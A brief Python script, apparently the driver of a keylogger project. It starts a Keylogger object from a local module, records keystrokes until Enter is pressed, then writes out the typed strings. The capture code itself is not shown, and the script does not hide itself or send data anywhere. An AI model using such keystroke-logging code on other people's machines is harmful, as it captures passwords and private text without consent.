import keyboard
import keylogger


def main():

    keylogger_instance = keylogger.Keylogger()

    keylogger_instance.startRecording()

    while True:
        keyboard.wait('enter')
        stoppedRecording = keylogger_instance.stopRecording()
        keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
        keylogger_instance.writeKeysPressed(keysPressed)
        break


main()
